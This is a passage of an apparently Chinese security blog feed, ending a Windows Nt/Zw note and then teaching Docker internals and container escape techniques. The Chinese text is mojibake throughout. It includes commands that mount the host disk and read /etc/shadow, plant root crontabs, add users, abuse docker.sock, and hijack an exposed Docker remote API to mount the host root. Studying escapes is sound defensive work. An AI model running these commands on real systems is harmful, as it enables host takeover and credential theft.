<p>Zw ï¼ æ²¡æœ‰å…·ä½“çš„ç¼©å†™å«ä¹‰ï¼Œåªæ˜¯ä¸ºäº†é¿å…å’Œå…¶å®ƒå‰ç¼€çš„é‡å¤ã€‚å®ƒçš„åŠŸèƒ½å’Œä¸ä¹‹ç›¸å¯¹åº”çš„Ntå‡½æ•°æ˜¯ä¸€è‡´çš„ï¼ˆå¯ä»¥è¯´æ˜¯NtåŠŸèƒ½çš„é•œåƒï¼‰ã€‚ ä¸åŒç‚¹åœ¨äºï¼š ç›¸åº”çš„Ntå‡½æ•°ï¼Œæ˜¯å¯¹ç³»ç»ŸæœåŠ¡çš„ç›´æ¥ï¼›è€ŒZwéœ€è¦ç»è¿‡ä¸€ç³»åˆ—ç³»ç»Ÿå‡†å¤‡åŠ¨ä½œï¼Œæ¯”å¦‚ï¼šç³»ç»ŸæœåŠ¡ç å…¥å¯„å­˜å™¨ä¿å­˜ï¼Œç³»ç»ŸKiSystemServiceåŠ è½½ï¼Œç„¶åæ‰æ‰§è¡Œå…·ä½“çš„æœåŠ¡åŠŸèƒ½è°ƒç”¨ã€‚ çœ‹ç€è´Ÿæ‹…åŠ é‡äº†ï¼Œä½†å¥½å¤„æ˜¯ï¼Œåœ¨æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿå‚æ•°çš„ç³»åˆ—æ ¡éªŒä¸å¿…å†è¿›è¡Œäº†ï¼ˆæ‹œæ‰€è°“çš„previous access modeä¹‹èµï¼‰ï¼Œæ‰€ä»¥åè€Œè½»å¿«äº†ï¼›è€ŒNtç³»åˆ—å‡½æ•°è™½ç„¶è°ƒç”¨æ—¶ç®€æ´ï¼Œä½†æ¯ä¸€æ¬¡æ‰§è¡Œéƒ½è¦å‚æ•°æ ¡éªŒï¼Œå› æ­¤åè€Œç´¯èµ˜äº†ã€‚è¿™ä¹Ÿæ­£æ˜¯å†…æ ¸æ€ç¨‹åºï¼ˆæ¯”å¦‚é©±åŠ¨ç¨‹åºï¼‰å¤šç”¨Zwç³»ç»Ÿçš„åŸå› ï¼ˆå› ä¸ºéœ€è¦å’Œprevious modeæ‰“äº¤é“ï¼‰ã€‚</p>
<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><ul>
<li><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">Exploiting Reversing (ER) series: article 01 â€“ Exploit Reversing</a></li>
<li><a href="https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/">Exploiting Reversing (ER) series: article 02 â€“ Exploit Reversing</a></li>
<li><a href="https://www.slideshare.net/">Share &amp; Discover Presentations</a></li>
<li><a href="https://www.vergiliusproject.com/">windows undocumented structure: vergilius project</a></li>
<li><a href="http://windbg.info/doc/1-common-cmds.html">Windbg command: WinDbg.info</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-escape</title>
    <url>/2024/03/06/Docker%20escape/</url>
    <content><![CDATA[<blockquote>
<p>äº‘ğŸ˜¶â€ğŸŒ«ï¸</p>
</blockquote>
<span id="more"></span>

<p>OCIï¼ˆOpen Container Initiativeï¼‰è§„èŒƒæ˜¯äº‹å®ä¸Šçš„å®¹å™¨æ ‡å‡†ï¼Œå·²ç»è¢«å¤§éƒ¨åˆ†å®¹å™¨å®ç°ä»¥åŠå®¹å™¨ç¼–æ’ç³»ç»Ÿæ‰€é‡‡ç”¨ï¼ŒåŒ…æ‹¬ Docker å’Œ Kubernetesã€‚</p>
<p>ä» OCI è§„èŒƒå¼€å§‹äº†è§£å®¹å™¨é•œåƒï¼Œå¯ä»¥è®©æˆ‘ä»¬å¯¹å®¹å™¨æŠ€æœ¯å»ºç«‹æ›´å…¨é¢æ¸…æ™°çš„è®¤çŸ¥ï¼Œè€Œä¸æ˜¯å›¿äºå®ç°ç»†èŠ‚ã€‚OCI è§„èŒƒåˆ†ä¸ºÂ <code>Image spec</code>Â å’ŒÂ <code>Runtime spec</code>Â ä¸¤éƒ¨åˆ†ï¼Œå®ƒä»¬åˆ†åˆ«è¦†ç›–äº†å®¹å™¨ç”Ÿå‘½å‘¨æœŸçš„ä¸åŒé˜¶æ®µ</p>
<h2 id="Dockeræ ¸å¿ƒåŸç†"><a href="#Dockeræ ¸å¿ƒåŸç†" class="headerlink" title="Dockeræ ¸å¿ƒåŸç†"></a>Dockeræ ¸å¿ƒåŸç†</h2><p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäºÂ <a href="https://www.runoob.com/go/go-tutorial.html">Go è¯­è¨€</a>Â å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚</p>
<p>Dockerçš„å®ç°ä¾èµ–äºLinuxä¸­ä¼—å¤šçš„åŸºç¡€æœºåˆ¶ï¼ŒåŒ…æ‹¬ç”¨äºèµ„æºé™åˆ¶çš„cgroupï¼Œç”¨äºéš”ç¦»çš„Namespaceï¼Œä»¥åŠç”¨äºå®ç°dockeræ–‡ä»¶ç³»ç»Ÿçš„Union FSç­‰ã€‚</p>
<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p>èµ„æºéš”ç¦»</p>
<p>Linuxçš„ namespace å¯ä»¥å®ç°èµ„æºèƒ½å¤Ÿåœ¨ä¸åŒçš„å‘½åç©ºé—´é‡Œæœ‰ç›¸åŒçš„åç§°ï¼Œè­¬å¦‚åœ¨Â <code>Aå‘½åç©ºé—´</code>Â æœ‰ä¸ªpidä¸º1çš„è¿›ç¨‹ï¼Œè€Œåœ¨Â <code>Bå‘½åç©ºé—´</code>Â ä¸­ä¹Ÿå¯ä»¥æœ‰ä¸€ä¸ªpidä¸º1çš„è¿›ç¨‹ã€‚</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/nsproxy.h#L31">nsproxy.h</a>ï¼Œ7ç§namespaceï¼Œå¯¹äºæ¯ä¸ªä»»åŠ¡ <code>task_struct</code> éƒ½å­˜åœ¨ä¸€ä¸ªnsproxy æˆå‘˜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A structure to contain pointers to all per-process</span></span><br><span class="line"><span class="comment"> * namespaces - fs (mount), uts, network, sysvipc, etc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The pid namespace is an exception -- it&#x27;s accessed using</span></span><br><span class="line"><span class="comment"> * task_active_pid_ns.  The pid namespace here is the</span></span><br><span class="line"><span class="comment"> * namespace that children will use.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &#x27;count&#x27; is the number of tasks holding a reference.</span></span><br><span class="line"><span class="comment"> * The count for each namespace, then, will be the number</span></span><br><span class="line"><span class="comment"> * of nsproxies pointing to it, not the number of tasks.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The nsproxy is shared by tasks which share all namespaces.</span></span><br><span class="line"><span class="comment"> * As soon as a single namespace is cloned or unshared, the</span></span><br><span class="line"><span class="comment"> * nsproxy is copied.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">nsproxy</span> &#123;</span><br><span class="line">	<span class="type">refcount_t</span> count;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">uts_namespace</span> *uts_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">ipc_namespace</span> *ipc_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">mnt_namespace</span> *mnt_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">pid_namespace</span> *pid_ns_for_children;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">net</span> 	     *net_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns_for_children;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">cgroup_namespace</span> *cgroup_ns;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>namespaceä¹Ÿæ˜¯linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå°†å†…æ ¸èµ„æºåˆ†éš”å¼€ï¼Œä¸€ç»„è¿›ç¨‹èƒ½çœ‹åˆ°ä¸€äº›èµ„æºï¼Œè€Œå…¶ä»–ç»„çš„è¿›ç¨‹çœ‹åˆ°çš„æ˜¯ä¸åŒçš„èµ„æºï¼Œç»„ä¸ç»„ä¹‹é—´äº’ä¸å¹²æ‰°ï¼Œä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ã€‚ç®€å•æ¥è¯´ï¼Œnamespaceå°±æ˜¯å†…æ ¸æä¾›çš„ä¸€ç§è¿›ç¨‹é—´èµ„æºéš”ç¦»æŠ€æœ¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -al /proc/self/ns</span><br><span class="line">total 0</span><br><span class="line">dr-x--x--x 2 ubuntu ubuntu 0 Mar  6 09:28 .</span><br><span class="line">dr-xr-xr-x 9 ubuntu ubuntu 0 Mar  6 09:28 ..</span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 cgroup -&gt; <span class="string">&#x27;cgroup:[4026531835]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 ipc -&gt; <span class="string">&#x27;ipc:[4026531839]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 mnt -&gt; <span class="string">&#x27;mnt:[4026531841]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 net -&gt; <span class="string">&#x27;net:[4026531840]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid_for_children -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time_for_children -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 user -&gt; <span class="string">&#x27;user:[4026531837]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 uts -&gt; <span class="string">&#x27;uts:[4026531838]&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¸å…¶æœ‰å…³çš„ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœ‰ä¸ªunshareçš„å‘½ä»¤ï¼Œéœ€è¦åŒºåˆ†ä¸€ä¸‹</span></span><br><span class="line">$ man 2 unshare</span><br><span class="line">$ man <span class="built_in">clone</span></span><br></pre></td></tr></table></figure>

<p>unshareåˆ›å»ºå‘½åç©ºé—´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026531838]</span><br><span class="line">:/ <span class="comment"># unshare --uts /bin/bash</span></span><br><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026532690]</span><br></pre></td></tr></table></figure>

<h3 id="cgroup"><a href="#cgroup" class="headerlink" title="cgroup"></a>cgroup</h3><p>èµ„æºé™åˆ¶</p>
<p>cgroupï¼ˆcontrol groupï¼‰æ˜¯linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå¯ä»¥ç”¨äºé™åˆ¶ã€è®¡ç®—ã€éš”ç¦»è¿›ç¨‹ç»„å¯¹è®¡ç®—æœºèµ„æºçš„ä½¿ç”¨ï¼ˆå¦‚CPUã€memoryã€disk I&#x2F;Oã€networkç­‰ï¼‰ã€‚</p>
<p>cgroupæœ‰å¦‚ä¸‹å››ä¸ªåŠŸèƒ½ï¼š</p>
<ol>
<li>èµ„æºé™åˆ¶ï¼ˆResource limitsï¼‰ï¼šé™åˆ¶è¿›ç¨‹ç»„å¯¹æŸä¸€ç‰¹å®šèµ„æºï¼ˆCPUï¼Œdiskï¼Œæˆ–networkï¼‰çš„ä½¿ç”¨é‡</li>
<li>ä¼˜å…ˆçº§ï¼ˆPrioritizationï¼‰ï¼šé€šè¿‡ç»™æŸä¸ªcgroupä¸­çš„è¿›ç¨‹åˆ†é…å¤šä¸€äº›èµ„æºï¼ˆç›¸æ¯”äºå…¶ä»–cgroupï¼‰ï¼Œä»è€Œæé«˜ä¼˜å…ˆçº§</li>
<li>å®¡è®¡ï¼ˆAccountingï¼‰ï¼šè®°å½•è¿›ç¨‹&#x2F;è¿›ç¨‹ç»„ä½¿ç”¨çš„èµ„æºé‡</li>
<li>æ§åˆ¶ï¼ˆControlï¼‰ï¼šè¿›ç¨‹ç»„æ§åˆ¶ï¼Œå¦‚å¯ä»¥ä½¿ç”¨freezerå°†è¿›ç¨‹ç»„æŒ‚èµ·æˆ–æ¢å¤</li>
</ol>
<p>cgroupæ˜¯å®¹å™¨ï¼ˆcontainersï¼‰çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå› ä¸ºå®¹å™¨ä¸­é€šå¸¸ä¼šè¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œè¿™äº›è¿›ç¨‹é€šå¸¸éœ€è¦ä¸€å¹¶æ§åˆ¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/self/cgroup</span><br><span class="line">0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-4f943e0d-c769-40ec-92df-ca2643d86752.scope</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/fs/cgroup		<span class="comment"># æŸ¥çœ‹cgroupæ–‡ä»¶ç³»ç»Ÿï¼Œç›®å½•ä¸‹æ¯ä¸ªç›®å½•ä»£è¡¨ä¸€ä¸ªcgroupç±»å‹ã€‚æ¯ä¸€ä¸ªcgroupç±»éƒ½éµå¾ªå±‚çº§ç»“æ„</span></span><br></pre></td></tr></table></figure>


<h3 id="Union-FS"><a href="#Union-FS" class="headerlink" title="Union FS"></a>Union FS</h3><p>Union File System ï¼Œç®€ç§° UnionFSï¼Œ<strong>æŠŠå…¶ä»–æ–‡ä»¶ç³»ç»Ÿè”åˆåˆ°ä¸€ä¸ªè”åˆæŒ‚è½½ç‚¹çš„æ–‡ä»¶ç³»ç»ŸæœåŠ¡</strong>ï¼Œç›®çš„æ˜¯<strong>å°†å¤šä¸ªæ–‡ä»¶è”åˆåœ¨ä¸€èµ·æˆä¸ºä¸€ä¸ªç»Ÿä¸€çš„è§†å›¾</strong></p>
<p>å®ƒçš„æ€æƒ³æ˜¯ï¼Œå¦‚æœä¸€ä¸ªèµ„æºæ˜¯é‡å¤çš„ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™æ—¶å€™å¹¶ä¸éœ€è¦ç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºï¼Œè¿™ä¸ªèµ„æºå¯ä»¥è¢«æ–°æ—§å®ä¾‹å…±äº«ã€‚</p>
<p>åˆ›å»ºæ–°èµ„æºå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡å†™æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¯¹èµ„æºè¿›è¡Œä¿®æ”¹çš„æ—¶å€™ã€‚é€šè¿‡è¿™ç§èµ„æºå…±äº«çš„æ–¹å¼ï¼Œå¯ä»¥æ˜¾è‘—åœ°å‡å°‘æœªä¿®æ”¹èµ„æºå¤åˆ¶å¸¦æ¥çš„æ¶ˆè€—ï¼Œä½†æ˜¯ä¹Ÿä¼šåœ¨è¿›è¡Œèµ„æºä¿®æ”¹çš„æ—¶å€™å¢å‡å°éƒ¨åˆ†çš„å¼€é”€ã€‚</p>
<p>OverlayFSï¼šOverlayfs æ˜¯ä¸€ç§å †å æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¾èµ–å¹¶å»ºç«‹åœ¨å…¶å®ƒçš„æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šï¼ˆä¾‹å¦‚ ext4fs å’Œ xfs ç­‰ç­‰ï¼‰ï¼Œå¹¶ä¸ç›´æ¥å‚ä¸ç£ç›˜ç©ºé—´ç»“æ„çš„åˆ’åˆ†ï¼Œä»…ä»…å°†åŸæ¥åº•å±‚æ–‡ä»¶ç³»ç»Ÿä¸­ä¸åŒçš„ç›®å½•è¿›è¡Œâ€œåˆå¹¶â€ï¼Œç„¶åå‘ç”¨æˆ·å‘ˆç°ã€‚<a href="https://zhuanlan.zhihu.com/p/679328995">OverlayFS</a></p>
<h3 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h3><p>å¦‚æœè§‰å¾—ä¸æ˜ç™½ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„Docker</p>
<ul>
<li><a href="https://www.infoq.com/articles/build-a-container-golang/">Build Your Own Container Using Less than 100 Lines of Go</a></li>
<li><a href="https://www.wolai.com/curry00/rjPry5XyA6BLYyUoEaDWDm">æ‰‹å†™docker</a></li>
</ul>
<h2 id="Dockeré€ƒé€¸"><a href="#Dockeré€ƒé€¸" class="headerlink" title="Dockeré€ƒé€¸"></a>Dockeré€ƒé€¸</h2><h3 id="æ£€æµ‹Dockerç¯å¢ƒ"><a href="#æ£€æµ‹Dockerç¯å¢ƒ" class="headerlink" title="æ£€æµ‹Dockerç¯å¢ƒ"></a>æ£€æµ‹Dockerç¯å¢ƒ</h3><ul>
<li>æ£€æŸ¥æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨<code>.dockerenv</code>æ–‡ä»¶</li>
<li>æ£€æŸ¥Â <code>/proc/1/cgroup</code>Â æ˜¯å¦å­˜åœ¨å«æœ‰dockerå­—ç¬¦ä¸²!</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@06fcbcd12128:/<span class="comment"># ls -al /</span></span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar  6 01:52 .dockerenv</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ???</span></span><br><span class="line">root@06fcbcd12128:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">0::/</span><br></pre></td></tr></table></figure>

<h3 id="Docker-å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®"><a href="#Docker-å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®" class="headerlink" title="Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®"></a>Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®</h3><p>å¦‚æœè®¾å®šäº†ä»¥ä¸‹é…ç½®å°±ä¼šå¯¼è‡´ç›¸åº”çš„éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š</p>
<ul>
<li>â€“privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´</li>
<li>â€“net&#x3D;hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´</li>
<li>â€“pid&#x3D;hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´</li>
<li>â€“volume &#x2F;:&#x2F;hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´</li>
</ul>
<p>å½“æ“ä½œè€…æ‰§è¡Œ<code>docker run --privileged</code>æ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚å¯ä»¥é€šè¿‡å†™sshå¯†é’¥ã€è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼è¾¾åˆ°é€ƒé€¸ã€‚</p>
<p>åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼ï¼šCapEff ä¸»è¦æ˜¯æ£€æŸ¥çº¿ç¨‹çš„æ‰§è¡Œæƒé™ã€‚å¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff <a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">(1)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç‰¹æƒçº§ä¸‹</span></span><br><span class="line">bash-4.4<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000003fffffffff</span><br><span class="line">CapEff: 0000003fffffffff</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># éç‰¹æƒçº§ä¸‹</span></span><br><span class="line">root@a8a2a8be5ee4:/<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	00000000a80425fb</span><br><span class="line">CapEff:	00000000a80425fb</span><br><span class="line">CapBnd:	00000000a80425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure>

<p>æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œé€ƒé€¸</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ç£ç›˜æ–‡ä»¶</span></span><br><span class="line">fdisk -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‚è½½</span></span><br><span class="line"><span class="built_in">mkdir</span> -p hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br><span class="line"><span class="built_in">cat</span> /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šæ—¶ä»»åŠ¡</span></span><br><span class="line">/hacker/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æ·»åŠ æ–°çš„ç”¨æˆ·è¿›è¡Œç™»å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure>

<h3 id="Dockerå±é™©æŒ‚è½½"><a href="#Dockerå±é™©æŒ‚è½½" class="headerlink" title="Dockerå±é™©æŒ‚è½½"></a>Dockerå±é™©æŒ‚è½½</h3><h4 id="docker-sock"><a href="#docker-sock" class="headerlink" title="docker.sock"></a>docker.sock</h4><p>docker.sockæ˜¯**Dockerå®ˆæŠ¤è¿›ç¨‹(Docker daemon)<strong>é»˜è®¤ç›‘å¬çš„</strong>UnixåŸŸå¥—æ¥å­—(Unix domain socket)**ï¼Œå®¹å™¨ä¸­çš„è¿›ç¨‹å¯ä»¥é€šè¿‡å®ƒä¸Dockerå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚</p>
<p>docker.sockæŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock <span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>æ£€æµ‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure>

<h4 id="æ ¹ç›®å½•"><a href="#æ ¹ç›®å½•" class="headerlink" title="æ ¹ç›®å½•"></a>æ ¹ç›®å½•</h4><p>ç›¸å½“äºç›´æ¥å†™ä¸»æœºçš„æ ¹ç›®å½•äº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /mount_dir</span><br></pre></td></tr></table></figure>

<h4 id="procfs"><a href="#procfs" class="headerlink" title="procfs"></a>procfs</h4><p>æŸ¥çœ‹æ˜¯å¦æŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure>

<p>é€ƒé€¸ï¼Œ<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">(2)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯»æ‰¾åœ¨ä¸»æœºä¸‹çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="built_in">cat</span> /proc/mounts | xargs -d <span class="string">&#x27;,&#x27;</span> -n 1 | grep workdir</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥åå¼¹ shell åˆ°ç›®æ ‡çš„ proc ç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker-remote-API"><a href="#Docker-remote-API" class="headerlink" title="Docker remote API"></a>Docker remote API</h3><p>é€šè¿‡å°†å®¿ä¸»æœºçš„dockeræœåŠ¡é€šè¿‡socketçš„æ–¹å¼æš´éœ²ç»™å¤–éƒ¨è¿æ¥ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºä¹Ÿå¯ä»¥è®¿é—®dockeræœåŠ¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨ remote API æ¥æ“ä½œdockerè¿›è¡Œé€ƒé€¸</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨</span></span><br><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è¿œç¨‹çš„æ ¹ç›®å½•æŒ‚è½½</span></span><br><span class="line">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="ç¨‹åºæ¼æ´å¯¼è‡´Docker-é€ƒé€¸"><a href="#ç¨‹åºæ¼æ´å¯¼è‡´Docker-é€ƒé€¸" class="headerlink" title="ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸"></a>ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸</h3><p>ä½¿ç”¨ <code>docker version</code> å‘½ä»¤å¯ä»¥çœ‹åˆ° <code>runc &amp;&amp; containerd</code> ç»„ä»¶</p>
